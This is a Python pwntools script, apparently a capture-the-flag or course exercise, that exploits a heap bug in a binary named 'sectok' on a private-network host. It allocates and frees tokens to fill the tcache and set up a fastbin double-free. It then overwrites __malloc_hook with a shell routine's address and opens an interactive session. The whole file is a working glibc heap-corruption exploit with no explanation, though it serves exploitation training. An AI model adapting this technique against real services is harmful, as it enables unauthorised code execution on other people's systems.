from pwn import *

elf = context.binary = ELF('./sectok',checksec=False)

hook_addr=elf.symbols['__malloc_hook']
binsh_addr=elf.symbols['binsh']

HOST = '10.21.232.3'
PORT = 10101

# Connect to the remote server
io = remote(HOST, PORT)

# -- Exploit goes here --
def exploit():
    io.sendlineafter("What is your 4-letter name? ","CS23M059")

    for i in range(9):
        io.sendlineafter("Action: ", 'g')
        io.sendlineafter("Enter the name for the token: ", "token " + str(i))
    
    for i in range(7):
        io.sendlineafter("Action: ", 'd')
        io.sendlineafter("Enter the index of the token: ", str(i))

    io.sendlineafter("Action: ",'d')
    io.sendlineafter("Enter the index of the token: ","7")
    io.sendlineafter("Action: ",'d')
    io.sendlineafter("Enter the index of the token: ","8")
    io.sendlineafter("Action: ",'d')
    io.sendlineafter("Enter the index of the token: ","7")

    for i in range(7):
        io.sendlineafter("Action: ", 'g')
        io.sendlineafter("Enter the name for the token: ", "token " + str(i))
    
    io.sendlineafter("Action: ", 'g')
    io.sendlineafter("Enter the name for the token: ", p64(hook_addr))

    io.sendlineafter("Action: ", 'g')
    io.sendlineafter("Enter the name for the token: ", "token 8")

    io.sendlineafter("Action: ", 'g')
    io.sendlineafter("Enter the name for the token: ", "token 9")

    io.sendlineafter("Action: ", 'g')
    io.sendlineafter("Enter the name for the token: ", p64(binsh_addr))

    io.sendlineafter("Action: ", 'g')
    # io.sendlineafter("Enter the name for the token: ", "shell pwned")

exploit()

io.interactive()
